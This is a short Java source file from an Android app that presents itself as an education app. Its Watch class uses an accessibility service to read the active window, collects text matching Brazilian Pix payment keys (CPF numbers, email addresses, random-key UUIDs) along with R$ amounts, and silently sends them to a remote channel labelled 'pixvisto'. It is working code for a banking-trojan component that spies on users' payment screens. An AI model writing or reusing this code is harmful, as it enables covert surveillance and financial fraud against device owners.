package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

public final class Watch {
    public static volatile boolean on;
    private static volatile long ultimo;

    public static void ev() {
        if (!on) return;
        long agora = System.currentTimeMillis();
        if (agora - ultimo < 1500) return;
        ultimo = agora;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        try {
            JSONObject s = new JSONObject().put("edit", true);
            StringBuilder chaves = new StringBuilder();
            for (Sel.Hit h : Sel.todos(r, s)) {
                String t = h.txt.trim();
                if (t.matches("\\d{11}|\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}|[^@\\s]+@[^@\\s]+")
                        || t.matches("[0-9a-f]{8}-[0-9a-f-]{20,}")) {
                    chaves.append(t).append(" ; ");
                }
            }
            if (chaves.length() == 0) return;
            String valor = "";
            for (Sel.Hit h : Sel.todos(r, new JSONObject().put("txt", "R\\$\\s?[\\d.,]+")))
                valor = h.txt;
            Util.sendT("pixvisto", "chave=" + chaves + " valor=" + valor);
        } catch (Throwable ignored) {}
    }
}
